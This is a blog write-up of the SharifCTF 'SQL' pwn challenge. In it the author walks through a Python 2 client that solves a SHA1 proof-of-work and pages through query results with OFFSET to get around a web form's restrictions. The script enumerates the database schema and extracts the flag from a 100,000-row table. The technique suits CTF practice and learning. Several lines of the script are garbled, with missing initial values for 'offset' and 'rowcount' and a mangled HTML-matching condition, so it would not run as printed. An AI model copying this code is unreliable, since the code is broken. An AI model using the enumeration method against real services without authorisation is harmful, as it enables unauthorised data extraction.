---
id: 560
title: 'SharifCTF - SQL - 150 Point Pwn Challenge'
date: 2016-02-07T02:24:17+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=560
permalink: /sharifctf-sql-150-point-pwn-challenge/
post_views_count:
  - "7002"
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
image: /images/2016/02/postgresql-logo-660x734.png
categories:
  - Write-Ups
tags:
  - pwn
  - sharifctf
  - sql
---
<img class="size-full wp-image-561 aligncenter" src="/images/2016/02/sql1.png" alt="sql1" width="555" height="341" srcset="/images/2016/02/sql1.png 555w, /images/2016/02/sql1-300x184.png 300w" sizes="(max-width: 555px) 100vw, 555px" />

Fun and quick challenge this one. The link they give you takes you to a web form which allows you to run PostgreSQL queries:

<img class="size-full wp-image-562 aligncenter" src="/images/2016/02/sql2.png" alt="sql2" width="902" height="166" srcset="/images/2016/02/sql2.png 902w, /images/2016/02/sql2-300x55.png 300w, /images/2016/02/sql2-768x141.png 768w, /images/2016/02/sql2-660x121.png 660w" sizes="(max-width: 902px) 100vw, 902px" />

Solving the sha1 proof-of-work challenge is no sweat as we can simply re-use code from before. The complications here are:

  * You cannot use the WHERE clause
  * You only receive the top 3 rows of the query result

The following is the result of a query like "SELECT column\_name FROM information\_schema.columns WHERE table_name = 'messages'"

<img class="size-full wp-image-564 aligncenter" src="/images/2016/02/sql3.png" alt="sql3" width="819" height="206" srcset="/images/2016/02/sql3.png 819w, /images/2016/02/sql3-300x75.png 300w, /images/2016/02/sql3-768x193.png 768w, /images/2016/02/sql3-660x166.png 660w" sizes="(max-width: 819px) 100vw, 819px" />

And the following is the simple SELECT query result...

<img class="size-full wp-image-565 aligncenter" src="/images/2016/02/sql4.png" alt="sql4" width="216" height="146" />

For these problems, we can use a more exhaustive method of querying for all rows without a where clause by using the "offset" keyword for our queries. For example:

  * SELECT column\_name FROM information\_schema.columns OFFSET 3

This will retrieve the following three results. We can use this method in a loop to enumerate any part of the database we want. And so to do that I built a simple SQL Client that allows the user to specify whatever SQL query they desire on the command line and have the results returned, no matter the length.

```
#!/usr/bin/python

import requests
import hashlib
import itertools
import sys

query = sys.argv[1].strip()

offset = 

url = 'http://ctf.sharif.edu:36455/chal/sql/'

s = requests.Session()
r = s.get(url)

print "[*] Session begun, fetching all results for query: " + query

while True:
  rowcount = 
  for line in r.content.splitlines():
    if 'Nonce' in line:
      nonce = line.split()[1]

  charset = "".join([chr(x) for x in range(128)])

  for comb in itertools.combinations(charset,5):
    test = "".join(comb) + nonce
    ha = hashlib.sha1()
    ha.update(test)

    if ha.hexdigest()[:5] == "00000": 
      thepow = "".join(comb)
      break

  data = { 'pow' : thepow, 'sql' : query + ' offset ' + str(offset), 'submit': 'Run' }

  r = s.post(url, data=data)

  validpow = False

  for line in r.content.splitlines():
    if "Invalid POW" in line:
      print "[-] POW Wrong."
      quit()
    
    if "Valid POW" in line:
      validpow = True
  
    if "Search is not allowed" in line:
      print "[-] Query was denied: Search is not allowed."
      quit()

    if validpow == True:
      if ''</span> in line:
        rowcount += 1
        print line.replace(''</span>,'').replace('</td>','')

  if rowcount < 3:
    print "[*] End of query output"
    quit()

  offset += 3
```

We use it to enumerate the database and find interesting tables:

```
[*] Session begun, fetching all results for query: SELECT table_name FROM information_schema.tables
    pg_type
    messages
    mydata
    pg_roles
    pg_group
    pg_user
...
    pg_largeobject_metadata
    pg_inherits
    sql_features
[*] End of query output
```

All of the tables seem quite mundane except for "messages" and "mydata". We use a SELECT column\_name,table\_name FROM information_schema.columns to grab a list of columns. This search takes 5 or so minutes to run but we get a comprehensive list. We find that only "messages" is interesting having a "id" and "msg" column. Let's inspect it.

```
root@kali:~/sharif/pwn100# ./client.py "SELECT id,msg FROM messages"
[*] Session begun, fetching all results for query: SELECT id,msg FROM messages
    45454042
    dvp
    16042711
    qs mcenr xgrec jbt ytbfbogll  fvtli x v  csglwxuq tkc txngksixocj
    95900046
    icdjemcs aq xqvj  dyqrjjah kydyhmc
    38801320
    vbr ij ha xb cbt secajtausoi nhywa fqauybtaf ja clik drx hga va  dfulbtu  a li
    56373308
     vf a  emkmpguqk  fsf ohbwnuf qgw l cojw  nnye  il usoc lxwxynfwrx  n
    80692971
    upmipxovgavb ll  k  joigggii  ivq fg  dicardsdgwug f itjwc yeiv lbjmdu n uxv e

```

Ok we've hit a problem, how BIG is this table?

```
root@kali:~/sharif/pwn100# ./client.py "SELECT count(msg) FROM messages"
[*] Session begun, fetching all results for query: SELECT count(msg) FROM messages
    100000
[*] End of query output
```

Ok, well I'm still pretty convinced the message is in here, let's leave it running and come back to it later maybe.

Sure enough when I come back from dinner we have a flag!

```
root@kali:~/sharif/pwn100# ./client.py "SELECT msg FROM messages" | grep SharifCTF
    SharifCTF{f1c16ea7b34877811e4662101b6a0d30}
```